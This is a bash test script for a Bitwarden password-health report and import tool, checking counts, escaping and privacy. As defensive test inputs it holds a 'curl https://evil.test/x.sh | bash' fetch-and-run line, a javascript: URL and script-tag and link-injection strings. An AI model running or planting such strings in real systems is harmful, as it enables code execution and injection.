#!/bin/bash
# End-to-end tests. Run on a Mac: bash tests/run.sh
# Every check is a hard assertion; the script exits non-zero on the first failure.
set -euo pipefail
cd "$(dirname "$0")/.."
ROOT="$PWD"
FX="$ROOT/tests/fixture"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT
pass() { printf 'ok   %s\n' "$*"; }
expect() { # expect <file> <regex> <description>
  grep -qE "$2" "$1" || { printf 'FAIL %s\n--- %s ---\n' "$3" "$1"; cat "$1"; exit 1; }
  pass "$3"
}

# --- report: html, offline -------------------------------------------------------------------
# The report is one HTML page built straight from the data. tests/report_text.py flattens it into lines
# (headings, '| a | b |' table rows, one line per card or paragraph) so the checks below can grep it.
flat() { uv run --quiet tests/report_text.py "$1" >"${1%.html}.txt"; } # <page.html>: writes page.txt beside it
uv run --quiet bw_report.py --input "$FX/items.json" --no-hibp --no-twofa --out "$WORK/report.html" >/dev/null
flat "$WORK/report.html"; T="$WORK/report.txt"
expect "$T" '^Logins with a password: 5 · In trash \(ignored, empty it\): 1 · ' "report counts live logins and leaves out the trash"
expect "$T" '^Fix soon 3 Reused$' "report counts the sites that share a password"
expect "$T" '^\| Password A \| 3 \| 3 sites ' "report shows how many sites one reused password is on"
expect "$T" '^Fix soon 3 Weak$' "report counts weak sites"
expect "$T" '^\| netflix.com \| Mom@gmail.com \| 2 \| Needs pick \|$' "www.netflix.com and netflix.com with one username, any capitals, are one site with two copies"
expect "$T" '^\| 1 · Email & main accounts \| google.com \| mom@gmail.com \|' "report ranks email first"
expect "$T" '^\| 5 · Everything else \| netflix.com \|' "report does not match x.com inside netflix.com"
expect "$T" '^Exposed in a breach: not checked this run \(--no-hibp\)\.$' "report marks breach check skipped"
expect "$T" '^Not run not checked Exposed$' "a skipped breach check is a card that says so, not a count"
! grep -q 'password123' "$WORK/report.html" || { echo "FAIL a password leaked into the report"; exit 1; }
pass "report never prints a password"
! grep -qiE '<(script|link|img|iframe|object)[^>]* (src|href)=|@import|url\(' "$WORK/report.html" || { echo "FAIL the report loads something from outside the page"; exit 1; }
! grep -q '\*\*\|\](http\|^| ' "$WORK/report.html" || { echo "FAIL Markdown reached the html"; exit 1; }
pass "the report is one self-contained page with no Markdown in it"
if uv run --quiet bw_report.py --input "$FX/items.json" --no-hibp --no-twofa --html --out "$WORK/report-old.html" >"$WORK/report-old.log" 2>&1; then
  echo "FAIL the retired --html option was accepted silently"; exit 1
fi
expect "$WORK/report-old.log" 'unrecognized arguments: --html' "the retired --html option is refused by name"

# --- report: breach check against Have I Been Pwned ---------------------------------------
uv run --quiet bw_report.py --input "$FX/items.json" --no-twofa --out "$WORK/report-hibp.html" >/dev/null
flat "$WORK/report-hibp.html"
expect "$WORK/report-hibp.txt" '^Urgent 3 Exposed$' "breach check flags the sites whose password is in breach lists"
expect "$WORK/report-hibp.txt" '^\| google.com \| mom@gmail.com \| [0-9,]+ \|$' "breach table has a count"
expect "$WORK/report-hibp.txt" '^\| Password A \| 3 \| .* \| Exposed seen [0-9,]+ times \|$' "a reused password says whether it is exposed"

# --- report: the live path, through a stand-in bw that only accepts the real subcommands ----
# Pins the argv bw_report.py sends (`list` and `items` as two arguments). It cannot catch a
# change in what the real bw prints; the fixture stands in for that.
mkdir "$WORK/fakebin"
cat >"$WORK/fakebin/bw" <<EOF
#!/bin/bash
case "\$#:\$1:\$2" in
  1:status:) echo '{"status":"unlocked","serverUrl":"https://vault.bitwarden.eu"}' ;;
  1:sync:) echo 'Syncing complete.' ;;
  2:list:items) cat "$FX/items.json" ;;
  2:list:folders) cat "$FX/folders.json" ;;
  *) echo "Invalid command: \$*" >&2; exit 1 ;;
esac
EOF
chmod +x "$WORK/fakebin/bw"
PATH="$WORK/fakebin:$PATH" BW_SESSION=fake uv run --quiet bw_report.py --no-hibp --no-twofa --out "$WORK/report-live.html" >/dev/null
flat "$WORK/report-live.html"
expect "$WORK/report-live.txt" '^Logins with a password: 5 ' "live path reads the vault through bw list items"
expect "$WORK/report-live.html" 'href="https://vault.bitwarden.eu/#/vault\?itemId=1"' "live path links to the web vault of the server bw reports (EU here)"

# --- report: password shapes a real vault has and the fixture lacks -----------------------
# A 200-character password (zxcvbn refuses anything over 72) and a non-ASCII one. Pins that the
# report completes and counts them; it cannot catch a shape neither of these is.
LONG_PW="$(printf 'Qx7!mZ2@%.0s' $(seq 1 25))"
/usr/bin/jq --arg long "$LONG_PW" '. + [
  {"id":"90","type":1,"name":"Long","deletedDate":null,"login":{"username":"a@b.com","password":$long,"uris":[{"uri":"https://long.example.com"}]}},
  {"id":"91","type":1,"name":"Unicode","deletedDate":null,"login":{"username":"c@d.com","password":"pässwörd-日本語-🔑","uris":[{"uri":"https://uni.example.com"}]}}
]' "$FX/items.json" >"$WORK/items-shapes.json"
uv run --quiet bw_report.py --input "$WORK/items-shapes.json" --no-hibp --no-twofa --out "$WORK/report-shapes.html" >/dev/null
flat "$WORK/report-shapes.html"
expect "$WORK/report-shapes.txt" '^Logins with a password: 7 ' "a 200-character and a non-ASCII password are scored, not fatal"

# --- report: a copy of the same account is not reuse --------------------------------------
# Copies of Gmail (inside a reuse group) and Chase (unique password): same site, username and
# password. Pins that copies add nothing to the reuse counts or the fix list; it cannot catch a
# copy whose site or username is spelled differently, which is a different account here.
/usr/bin/jq '. + [
  {"id":"92","type":1,"name":"Gmail copy","deletedDate":null,"login":{"username":"mom@gmail.com","password":"password123","uris":[{"uri":"https://accounts.google.com"}]}},
  {"id":"93","type":1,"name":"Chase copy","deletedDate":null,"login":{"username":"mom","password":"Xk9#mPq2$vL7nR4wZ!t8","uris":[{"uri":"https://chase.com"}]}}
]' "$FX/items.json" >"$WORK/items-copies.json"
uv run --quiet bw_report.py --input "$WORK/items-copies.json" --no-hibp --no-twofa --out "$WORK/report-copies.html" >/dev/null
flat "$WORK/report-copies.html"
expect "$WORK/report-copies.txt" '^\| Password A \| 3 \| ' "copies of one account do not count as reuse"
expect "$WORK/report-copies.txt" '^Urgent 3 Need a new password$' "the fix list counts sites (Gmail, Roblox, Netflix), not copies"
expect "$WORK/report-copies.txt" '^\| 1 · Email & main accounts \| google.com \| mom@gmail.com \| Reused ×3 Weak Duplicate \| 2 ' "a site's copies are one row, with the copies counted"

# --- report: fix order, two-step, AutoFill, old passwords, notes, links, progress -------------------
# One fixture vault (tests/fixture/health.json) with an item per case; its one "recent" item gets a
# creation date ten days back. Runs in UTC so the dates printed are the fixture's own. Cannot catch
# the real 2FA Directory list, or the real web vault's link format, changing shape.
H="$WORK/health.json"; R="$WORK/h1.html"; T="$WORK/h1.txt"
/usr/bin/jq --arg recent "$(date -u -v-10d +%Y-%m-%dT%H:%M:%SZ)" 'map(if .creationDate == "RECENT" then .creationDate = $recent else . end)' "$FX/health.json" >"$H"
health() { # health <vault json> <report.html> <args...>; what it prints goes to <report.html>.log, the flat text to <report>.txt
  local vault="$1" out="$2"; shift 2
  TZ=UTC uv run --quiet bw_report.py --input "$vault" --folders "$FX/health-folders.json" --no-hibp --out "$out" "$@" >"$out.log" 2>&1 && flat "$out"
}
section() { sed -n "/^## $1/,/^## /p" "$T"; } # one section of the flat report, by its heading
health "$H" "$R" --twofa-file "$FX/twofa.json" --state "$WORK/progress.json" || { cat "$R.log"; echo "FAIL the report on the health fixture"; exit 1; }

# Fix order: a listed domain or an address under it, never a word inside another name; a folder line wins.
expect "$T" '^\| 2 · Money & shopping \| example.org \| a \| Weak \|' "a folder named in the fix order sets the tier, capitals ignored"
expect "$T" '^\| 5 · Everything else \| epicurious.com \| cook \| Weak \|' "epicurious.com is not a gaming site"
expect "$T" '^\| 5 · Everything else \| example.com \| look \| Weak \|' "gmail.example.com is not Gmail"
expect "$T" '^\| 5 · Everything else \| example.com \| a@example.com \| saved 2020-01-01 \|$' "mail.example.com is not an email provider"
expect "$T" '^\| 1 · Email & main accounts \| google.com \| a@example.com \| last changed 2021-03-03 \|$' "an address under a listed domain takes its tier"
expect "$WORK/report.txt" '^\| 4 · Gaming & social \| roblox.com' "gaming and social is the fourth tier"
echo '[{"id":"v1","type":1,"name":"Phone","deletedDate":null,"login":{"username":"a","password":"letmein","uris":[{"uri":"https://login.verizon.com"}]}}]' >"$WORK/carrier.json"
health "$WORK/carrier.json" "$WORK/carrier.html" --no-twofa
expect "$WORK/carrier.txt" '^\| 3 · Phone, utilities, insurance & health \| verizon.com \| a \|' "a phone carrier is the third tier"
printf '1 google.com\n2 not a domain\n' >"$WORK/bad-order.txt"
if health "$H" "$WORK/bad-order.html" --no-twofa --fix-order "$WORK/bad-order.txt"; then echo "FAIL a malformed fix-order line was accepted"; exit 1; fi
expect "$WORK/bad-order.html.log" "bad-order.txt line 2: 'not a domain' is not a domain like example.com" "a malformed fix-order line is named with its line number"
printf '1 example.com\n2 example.com\n' >"$WORK/bad-order.txt"
if health "$H" "$WORK/bad-order.html" --no-twofa --fix-order "$WORK/bad-order.txt"; then echo "FAIL a domain listed in two tiers was accepted"; exit 1; fi
expect "$WORK/bad-order.html.log" "line 2: 'example.com' is listed twice with different tiers" "a domain listed in two tiers is refused"
pass "the fix order matches listed domains and folders only"

# Two-step login: matched here against a saved copy of the list. A site counts when the list has it, an
# address under it, or (through the fix order's domain) another address of the same site. One row per website.
expect "$T" '^Check 4 Two-step to check$' "two-step login counts sites with no code saved"
expect "$T" "this site offers two-step login; check it's on" "the two-step wording does not claim to know whether it is on"
section 'Two-step login' >"$WORK/twofa-section.txt"
expect "$WORK/twofa-section.txt" '^\| gmail.com \| a@example.com \| supports two-step \|$' "an address that is on the list itself reads: supports two-step"
expect "$WORK/twofa-section.txt" '^\| chase.com \| a \| likely supports two-step \|$' "an address under a listed one reads: likely supports two-step"
expect "$WORK/twofa-section.txt" '^\| apple.com \| a@example.com \| likely supports two-step \|$' "another address of a site named in the fix order reads: likely"
expect "$WORK/twofa-section.txt" '^\| example.io \| a \| likely supports two-step \|$' "an address above a listed one reads: likely"
[ "$(grep -c '| supports two-step |' "$WORK/twofa-section.txt")" = "1" ] && [ "$(grep -c '| likely supports two-step |' "$WORK/twofa-section.txt")" = "3" ] || { cat "$WORK/twofa-section.txt"; echo "FAIL exactly one match is exact and three are likely"; exit 1; }
expect "$WORK/twofa-section.txt" '"Supports two-step" means the saved address itself is on the public list' "the report explains the two labels"
! grep -q 'sib\|bank' "$WORK/twofa-section.txt" || { cat "$WORK/twofa-section.txt"; echo "FAIL a site with no list entry and no shared domain was flagged"; exit 1; }
pass "a site with no list entry and no shared domain is not flagged (other.example.io beside login.example.io; bank.example.com)"
! grep -qE '^\| (google.com|example.com) \|' "$WORK/twofa-section.txt" || { cat "$WORK/twofa-section.txt"; echo "FAIL a login with a code saved, a site with no two-step login, or an unrelated site was flagged"; exit 1; }
grep -q 'accounts.google.com is compared as google.com' fix_order.txt && grep -q 'likely supports two-step' fix_order.txt || { echo "FAIL fix_order.txt must say how its domains feed the two-step check"; exit 1; }
expect "$T" '^Data sourced from 2FA Directory by 2factorauth\.$' "the list's source is credited, as its licence asks"
expect "$R" '<a href="https://2fa.directory/" target="_blank" rel="noopener noreferrer">2FA Directory</a>' "the credit links to the list"
health "$H" "$WORK/h-nolist.html" --twofa-file "$WORK/no-such-list.json" || { cat "$WORK/h-nolist.html.log"; echo "FAIL a missing two-step list stopped the report"; exit 1; }
not_checked() { # <flat report>: the two-step check must read "not checked this run", never a count and never "Nothing found"
  grep -q '^Not run not checked Two-step to check$' "$1" \
    && grep -q '^Not checked this run: the list of sites could not be downloaded\. This does not mean none were found\.$' "$1" \
    && ! sed -n '/^## Two-step login/,/^## /p' "$1" | grep -q 'Nothing found\|^| Site\|Data sourced'
}
not_checked "$WORK/h-nolist.txt" || { cat "$WORK/h-nolist.txt"; echo "FAIL a list that cannot be had must read: not checked this run"; exit 1; }
pass "a list that cannot be had reads: not checked this run, never none found"
expect "$WORK/h-nolist.html.log" 'The two-step check was not run' "a two-step check that did not run is said on the terminal too"
# The real download: the whole public list, kept for a day. A fresh copy is used as it is; a stale one is replaced.
CACHE="$WORK/twofa-cache.json"
health "$H" "$WORK/h-live.html" --twofa-cache "$CACHE" || { cat "$WORK/h-live.html.log"; echo "FAIL the report with the downloaded list"; exit 1; }
[ "$(/usr/bin/jq 'type == "object" and length > 1000' "$CACHE")" = "true" ] || { echo "FAIL the downloaded two-step list was not kept, or is not the shape expected"; exit 1; }
expect "$WORK/h-live.txt" ' [0-9]+ Two-step to check$' "the downloaded list is used"
cp "$FX/twofa.json" "$CACHE"
health "$H" "$WORK/h-cached.html" --twofa-cache "$CACHE"
cmp -s "$FX/twofa.json" "$CACHE" || { echo "FAIL a copy of the list younger than a day was downloaded again"; exit 1; }
expect "$WORK/h-cached.txt" '^Check 4 Two-step to check$' "a fresh kept copy of the list is the one used"
# No network (every request is sent to a port nothing listens on): a copy older than a day is not trusted,
# and with no copy at all the check cannot run. Both read "not checked this run".
offline() { ( unset no_proxy NO_PROXY; export https_proxy=http://127.0.0.1:9 HTTPS_PROXY=http://127.0.0.1:9; "$@" ); }
touch -t "$(date -v-2d +%Y%m%d%H%M)" "$CACHE"
offline health "$H" "$WORK/h-stale-offline.html" --twofa-cache "$CACHE" || { cat "$WORK/h-stale-offline.html.log"; echo "FAIL a failed download stopped the report"; exit 1; }
not_checked "$WORK/h-stale-offline.txt" && cmp -s "$FX/twofa.json" "$CACHE" || { cat "$WORK/h-stale-offline.html.log"; echo "FAIL a list older than a day with no network must read: not checked this run"; exit 1; }
offline health "$H" "$WORK/h-none-offline.html" --twofa-cache "$WORK/no-cache-yet.json" || { echo "FAIL a failed download stopped the report"; exit 1; }
not_checked "$WORK/h-none-offline.txt" && [ ! -e "$WORK/no-cache-yet.json" ] || { echo "FAIL a failed download with no kept copy must read: not checked this run"; exit 1; }
pass "a failed download, or a stale copy with no network, reads: not checked this run"
health "$H" "$WORK/h-stale.html" --twofa-cache "$CACHE"
! cmp -s "$FX/twofa.json" "$CACHE" || { echo "FAIL a copy of the list older than a day was not replaced"; exit 1; }
pass "two-step login is matched locally against the whole list, kept for a day"

# AutoFill, old passwords, notes.
expect "$T" '^Tidy 2 AutoFill fixes 1 can be fixed for you$' "AutoFill problems are counted, with how many the fix step can do"
expect "$T" '^\| Garage code \| \(no username\) \| no web address saved \|$' "a login with no address is flagged, by its name"
expect "$T" '^\| oldsite.test \| s \| only an http:// address saved \|$' "a login with only an http:// address is flagged"
! section 'AutoFill problems' | grep -q 'router\|admin\|bank' || { echo "FAIL a device at home, or a login that also has an https:// address, was flagged"; exit 1; }
expect "$T" '^Old 2$' "old passwords are counted"
expect "$T" '^1 login was added in the last 30 days \(an import, for example\) and will be checked on later runs\.$' "a login added in the last 30 days is counted apart"
! section 'Passwords unchanged' | grep -q 'epicurious' || { echo "FAIL a login added ten days ago was judged old by its password date"; exit 1; }
expect "$T" '^Separately, 2 notes may hold a password\.$' "notes that may hold a password are counted"
expect "$T" '^\| Wifi details \| secure note \| a line that looks like a saved password or PIN \|$' "a secure note with a password line is flagged by name and reason"
expect "$T" '^\| Old forum \| login \| a line shaped like username:password \|$' "a login's note with a username:password line is flagged"
! section 'Notes that may hold' | grep -q 'Shopping list\|Trashed' || { echo "FAIL an ordinary note or a trashed item was flagged"; exit 1; }
expect "$T" 'cannot see whether your Bitwarden email address is verified, or whether two-step login is turned on' "the report says it cannot check the Bitwarden account itself"
expect "$R" '<a href="https://vault.bitwarden.com/#/settings/security/two-factor" target="_blank" rel="noopener noreferrer">Two-step login</a>' "it links to the two-step setting instead"
expect "$R" '<a href="https://vault.bitwarden.com/#/settings/account" target="_blank" rel="noopener noreferrer">Account settings</a>' "it links to the account page for email verification"
pass "AutoFill, old passwords, notes and the account pointers are reported"

# Links sit on the values: the site opens its change-password address, the account its Bitwarden entry.
# Built from a checked domain and item id only; nothing in the vault can add a link of its own.
expect "$R" '<a class="v" href="https://example.org/.well-known/change-password" title="Change password" target="_blank" rel="noopener noreferrer">example.org<svg' "a site's name links to its change-password address, with a tooltip"
expect "$R" '<a class="v" href="https://vault.bitwarden.com/#/vault\?itemId=h5" title="Open in Bitwarden" target="_blank" rel="noopener noreferrer">a<svg' "an account links to its Bitwarden entry, with a tooltip"
! grep -q '>Links<\|>Actions<\|>Change password<\|>Open in Bitwarden<\|>Site</a>\|href="https://forum.example.org/"' "$R" || { echo "FAIL a links column, a link word or a separate site link is back"; exit 1; }
! grep -q 'href="https://oldsite.test' "$R" || { echo "FAIL a site saved with http:// only was linked as https://"; exit 1; }
health "$H" "$WORK/h-server.html" --twofa-file "$FX/twofa.json" --vault-url https://bw.example.org:8443/base/
expect "$WORK/h-server.html" 'href="https://bw.example.org:8443/base/#/vault\?itemId=h5"' "the Bitwarden link uses the account's own server"
! grep -q 'href="https://evil.example' "$R" || { echo "FAIL an item name became a link"; exit 1; }
health "$H" "$WORK/h-oddvault.html" --no-twofa --vault-url 'javascript:alert(1)'
! grep -q 'Open in Bitwarden\|javascript' "$WORK/h-oddvault.html" || { echo "FAIL a server address that is not a plain web address was put in a link"; exit 1; }
expect "$WORK/h-oddvault.txt" 'In the Bitwarden web vault, open Settings, then Security, then Two-step login' "without a usable server address the account pointers are words, not links"
pass "links come from the saved address, the item id and the server only"

# Progress: the file holds item ids and reason names, nothing else, and the next run compares against it.
expect "$T" '^First check-up of this vault on this Mac: 14 entries flagged\.' "a first run says so and counts what is flagged"
P="$WORK/progress.json"
[ "$(stat -f %Lp "$P")" = "600" ] || { echo "FAIL the progress file is not owner-only"; exit 1; }
[ "$(/usr/bin/jq -c --slurpfile vault "$H" '[(keys == ["checks","date","flagged","version"]), ((.flagged | keys) - ($vault[0] | map(.id)) == []), ([.flagged[][], .checks[]] | all(IN("exposed","reused","weak","duplicate","two-step","autofill","old","notes"))), (.flagged | length == 14), (.flagged.h5 == ["weak"]), (.checks | index("exposed") == null)]' "$P")" = "[true,true,true,true,true,true]" ] || { cat "$P"; echo "FAIL the progress file must hold item ids and reason names only, and only the checks that ran"; exit 1; }
! grep -qi 'forum\|example\|chase\|password1\|Hunter2\|jsmith\|Zr8' "$P" || { echo "FAIL a name, site, username or password reached the progress file"; exit 1; }
# Second run: Forum's password and the Wifi note are fixed; Bank app loses its https:// address.
/usr/bin/jq 'map(if .id == "h5" then .login.password = "Zr8#kLm2$Qv9xT4w-05" elif .id == "h9" then .notes = "nothing here" elif .id == "h8" then .login.uris = [{"uri":"http://bank.example.com"}] else . end)' "$H" >"$WORK/health2.json"
health "$WORK/health2.json" "$WORK/h2.html" --twofa-file "$FX/twofa.json" --state "$P"
expect "$WORK/h2.txt" '^2 fixed since [0-9]{4}-[0-9]{2}-[0-9]{2}, 13 left\. 1 new since then, marked NEW\. Counted in Bitwarden entries' "the next run counts what was fixed, what is left and what is new"
expect "$WORK/h2.txt" '^\| 5 · Everything else \| example.com \| bank \| AutoFill NEW \| 1 \|$' "a newly flagged site is marked NEW"
[ "$(grep -c '^|.* NEW |' "$WORK/h2.txt")" = "1" ] || { grep 'NEW' "$WORK/h2.txt"; echo "FAIL a site flagged before was marked NEW"; exit 1; }
# Third run without the two-step check: the four logins only it flags are neither fixed nor new.
health "$WORK/health2.json" "$WORK/h3.html" --no-twofa --state "$P"
expect "$WORK/h3.txt" '^0 fixed since [0-9]{4}-[0-9]{2}-[0-9]{2}, 9 left\. Counted' "a check that did not run is not counted as fixed"
echo '{"flagged": []}' >"$WORK/bad-progress.json"
if health "$H" "$WORK/h-badstate.html" --no-twofa --state "$WORK/bad-progress.json"; then echo "FAIL a progress file of the wrong shape was accepted"; exit 1; fi
expect "$WORK/h-badstate.html.log" 'is not a progress file this script wrote' "a progress file of the wrong shape is refused"
! grep -rq 'Hunter2-note-secret\|Tr0ub4dor-note-pair\|Trashed-note-secret\|HomeNet\|Zr8#kLm2\|password1\|letmein\|monkey12\|qwerty123' "$WORK"/h*.html "$WORK"/h*.txt "$WORK"/h*.log "$P" || { echo "FAIL a password or a note's text reached a report, the terminal or the progress file"; exit 1; }
pass "progress is kept as item ids and reasons only; no password or note text is ever written"

# --- report: one row per site, escaping, links and the summary (tests/fixture/dashboard.json) -------------
# Synthetic cases: six copies of one bank across secureNN subdomains and www., a masked username, a
# username holding a script tag, item names and addresses that try to form a link or an attribute, a
# co.uk site, two sites on github.io, a router's IP address, localhost and an app address. Cannot catch
# a shape of hostile text none of these is; the allowlist of link shapes below is the backstop.
D="$FX/dashboard.json"; DH="$WORK/d.html"; DT="$WORK/d.txt"
PASTE="curl -fsSL https://raw.githubusercontent.com/nellirob92/bw-health/v9.9.9/bw-health.sh | bash -s --"
uv run --quiet bw_report.py --input "$D" --no-hibp --no-twofa --paste-line "$PASTE" --user mom --summary "$WORK/d-summary.html" --out "$DH" >/dev/null
flat "$DH"; flat "$WORK/d-summary.html"
expect "$DT" '^\| 5 · Everything else \| bigbank.test \| member \| Duplicate \| 6 ' "six copies across secureNN subdomains, www. and a capitalised username are one site"
[ "$(grep -c '^| [0-9] · [^|]* | bigbank.test |' "$DT")" = "1" ] || { echo "FAIL the bank must be one row of the main table"; exit 1; }
expect "$DT" '^\| 5 · Everything else \| shop.co.uk \| uk \| Duplicate \| 2 ' "login.shop.co.uk and www.shop.co.uk are one site: co.uk is a shared ending"
expect "$DT" '^\| 5 · Everything else \| a.github.io \| dev \| Reused ×2 \| 1 \|$' "a.github.io is a site of its own"
expect "$DT" '^\| 5 · Everything else \| b.github.io \| dev \| Reused ×2 \| 1 \|$' "b.github.io is another site: github.io is a shared ending"
expect "$DT" '^\| 5 · Everything else \| 192.168.1.1:8080 \| admin \| Weak \| 1 \|$' "an IP address is a site of its own, with its port, never split into labels"
expect "$DT" '^\| 5 · Everything else \| localhost:3000 \| admin \| Weak \| 1 \|$' "localhost is a site of its own"
expect "$DT" '^\| 5 · Everything else \| androidapp://com.example.app \| app \| Weak \| 1 \|$' "an app address is a site of its own"
! grep -q 'href="https://192\|href="https://localhost\|href="androidapp\|href="https://example.app\|href="https://oldsite' "$DH" || { echo "FAIL a device, an app or an http://-only site got a change-password link"; exit 1; }
pass "sites are grouped by registrable domain from the public suffix list; devices and apps stand alone, unlinked"

expect "$DT" '^\| 5 · Everything else \| masked.test \| jo\*\*n@ex\*\*\*le.com \| Weak \| 1 \|$' "a masked username shows as it was typed"
! grep -q '<strong>n@ex\|<em>' "$DH" || { echo "FAIL a masked username turned into bold or italics"; exit 1; }
expect "$DH" '>&lt;script&gt;alert\(&quot;x&quot;\)&lt;/script&gt;<svg' "a username holding a script tag is escaped"
[ "$(grep -o '<script' "$DH" | wc -l | tr -d ' ')" = "1" ] || { echo "FAIL the page has a script other than its own"; exit 1; }
expect "$DT" '^\| 5 · Everything else \| \[click\]\(https://evil.test/a\) <a href="https://evil.test/b">b</a> \| ln \|' "an item name that tries to form a link shows as text"
! grep -q 'href="https://evil.test\|href="javascript\|onmouseover="alert' "$DH" || { echo "FAIL vault text formed a link or an attribute of its own"; exit 1; }
odd_links="$(grep -o 'href="[^"]*"' "$DH" | grep -vE '^href="(https://[a-z0-9.-]+/\.well-known/change-password|https://vault\.bitwarden\.com/#/(vault\?itemId=[A-Za-z0-9-]+|settings/account|settings/security/two-factor)|https://2fa\.directory/)"$' || true)"
[ -z "$odd_links" ] || { echo "$odd_links"; echo "FAIL a link outside the shapes the report builds"; exit 1; }
[ "$(grep -o '<a ' "$DH" | wc -l)" = "$(grep -o 'target="_blank" rel="noopener noreferrer"' "$DH" | wc -l)" ] || { echo "FAIL a link does not open in a new tab with noopener noreferrer"; exit 1; }
expect "$DT" '^Click a site to change its password \(if you land on the home page, look under account settings\)\. Click the account to open it in Bitwarden\.$' "one line above the tables says what the links do"
pass "vault text is escaped and can never form a link; every link is one the report builds"

expect "$DT" '^\| bigbank.test \| member \| 6 \| Yes \|$' "six copies with one password are safe to merge"
expect "$DT" '^\| fieldclash.test \| fc \| 2 \| No: a custom field with different values \|$' "a group with a field conflict is not safe, and says why"
expect "$DT" '^\| passkeyshop.test \| pk \| 2 \| Yes \|$' "a pair where one copy holds a passkey is safe to merge"
! sed -n '/^## Duplicate entries/,/^## /p' "$DT" | grep -q '^| [a-z]*\.github\.io ' || { echo "FAIL two sites on github.io were listed as duplicates"; exit 1; }
expect "$DT" '^Tidy 4 Duplicates 3 groups safe to merge$' "the duplicates card says how many groups are safe to merge"
expect "$DT" "^3 groups are safe to merge: .*$(printf '%s' "$PASTE" | sed 's/[|.]/\\&/g') --user mom dedupe merge\. Then act on one group first: .* --user mom dedupe merge apply 1, and type DEDUPE" "the report gives the exact commands, with the person's name"
[ "$(grep -o 'itemId=d7[ab]" title="Open in Bitwarden" target="_blank" rel="noopener noreferrer">pk<' "$DH" | sort -u)" = 'itemId=d7a" title="Open in Bitwarden" target="_blank" rel="noopener noreferrer">pk<' ] || { echo "FAIL the account must open the copy that holds the passkey, the one a merge keeps"; exit 1; }
expect "$DT" '^1 login saved with only an http:// address can get the https:// address added for you' "the report says how many logins the AutoFill fix can do"
expect "$DT" ' --user mom fixurls apply 1, and type FIXURLS when asked' "and the command to run it"
expect "$DT" '^Notes that may hold a password: Nothing found\.$' "an empty section is one line"
! grep -q '^## Notes that may hold\|^## Passwords unchanged' "$DT" || { echo "FAIL an empty section has a heading"; exit 1; }
expect "$DH" '<div id="tools" class="tools" hidden>' "the filter and the done boxes are added by the page's script, so without it the page is plain tables"
bad_ids="$(grep -o 'data-ids="[^"]*"' "$DH" | grep -vE '^data-ids="[A-Za-z0-9 -]+"$' || true)"
[ -z "$bad_ids" ] && grep -q "localStorage.setItem(KEY, JSON.stringify(done))" "$DH" || { echo "FAIL a done tick must be kept under item ids only"; exit 1; }
pass "duplicates, AutoFill commands, empty sections and the done boxes"

DS="$WORK/d-summary.txt"
expect "$DS" '^# Bitwarden summary for mom$' "the summary names the profile"
expect "$DS" '^## How an attacker or AI tool would use this$' "the summary explains the risks in plain words"
expect "$DS" '^Reused One leak from any site unlocks every other site' "one line per kind of risk"
expect "$DS" '^Everything else: [0-9]+ sites need work \(' "risks are counted by kind of site"
! grep -qiE 'bigbank|github|\.test|example|evil|member|admin|localhost|192\.168|jo\*\*n|script|@' "$DS" || { grep -iE 'bigbank|github|\.test|example|evil|member|admin|localhost|192\.168|jo\*\*n|script|@' "$DS"; echo "FAIL the summary holds a site, a username or a host"; exit 1; }
! grep -q 'href=\|itemId\|data-ids\|<script' "$WORK/d-summary.html" || { echo "FAIL the summary holds a link, an item id or a script"; exit 1; }
[ "$(stat -f %Lp "$WORK/d-summary.html")" = "600" ] || { echo "FAIL the summary is not owner-only"; exit 1; }
pass "the summary holds counts only: no site, username, host, item id or link"
if uv run --quiet bw_report.py --input "$D" --no-hibp --no-twofa --summary-only --out "$WORK/x.html" >"$WORK/so.log" 2>&1; then echo "FAIL --summary-only with --out was accepted"; exit 1; fi
expect "$WORK/so.log" '^--summary-only needs --summary, and takes no --out or --state' "--summary-only writes the summary and nothing else"
for bad in '--paste-line=curl https://evil.test/x.sh | bash' '--user=Mom Dad'; do
  if uv run --quiet bw_report.py --input "$D" --no-hibp --no-twofa "$bad" --out "$WORK/x.html" >"$WORK/bad-arg.log" 2>&1; then echo "FAIL '$bad' was accepted"; exit 1; fi
done
pass "a paste line or a name that is not the tool's own is refused"

# Right after an import every login is new, so old passwords are left for later runs.
/usr/bin/jq --arg recent "$(date -u -v-3d +%Y-%m-%dT%H:%M:%SZ)" 'map(.creationDate = $recent)' "$D" >"$WORK/fresh.json"
uv run --quiet bw_report.py --input "$WORK/fresh.json" --no-hibp --no-twofa --out "$WORK/fresh.html" >/dev/null
flat "$WORK/fresh.html"
expect "$WORK/fresh.txt" '^Passwords unchanged for 3\+ years: Checked on later runs\.$' "right after an import, old passwords read: checked on later runs"

# --- import diff --------------------------------------------------------------------------
uv run --quiet bw_import_diff.py "$FX/chrome.csv" "$FX/apple.csv" "$FX/chrome2.csv" --vault "$FX/items.json" --out-dir "$WORK/import" >/dev/null
expect "$WORK/import/conflicts.md" 'New, written to .*: \*\*4\*\*' "diff finds 4 new (3 Target rows collapse to 1, Patreon from the second account)"
expect "$WORK/import/conflicts.md" 'identical, skipped: 2' "diff skips identical entries"
expect "$WORK/import/conflicts.md" 'Conflicts, decide by hand: 2' "diff counts vault and export conflicts together"
expect "$WORK/import/conflicts.md" '^\| netflix.com \| MOM@gmail.com \| chrome.csv \| Netflix, netflix.com \|' "conflict names both vault items"
expect "$WORK/import/conflicts.md" '^\| target.com \| mom@gmail.com \| chrome.csv \| chrome2.csv \|' "export conflict: newer file wins, older named"
expect "$WORK/import/new-for-bitwarden.csv" '^folder,favorite,type,name,notes,fields,reprompt,login_uri,login_username,login_password,login_totp$' "csv has the Bitwarden header"
PATH="$WORK/fakebin:$PATH" BW_SESSION=fake uv run --quiet bw_import_diff.py "$FX/chrome.csv" "$FX/apple.csv" "$FX/chrome2.csv" --out-dir "$WORK/import-live" >/dev/null
diff "$WORK/import/conflicts.md" <(sed 's#/import-live/#/import/#' "$WORK/import-live/conflicts.md") || { echo "FAIL live diff differs from the --vault diff"; exit 1; }
pass "diff reads the live vault through bw list items, same result as --vault"
[ "$(wc -l <"$WORK/import/new-for-bitwarden.csv" | tr -d ' ')" = "5" ] || { echo "FAIL csv row count"; exit 1; }
grep -q 'Tgt-9988-xyz' "$WORK/import/new-for-bitwarden.csv" || { echo "FAIL newer export password must be the one imported"; exit 1; }
! grep -q 'OLD-target-pw' "$WORK/import/new-for-bitwarden.csv" || { echo "FAIL older export password must not be imported"; exit 1; }
pass "csv holds exactly the 4 new rows, newest export wins a disagreement"

# --- a malformed URL (an unclosed IPv6 bracket) in a real vault or export must not abort the run ----
# Pins that the report and the diff complete and count the entry; it cannot catch another shape of bad URL.
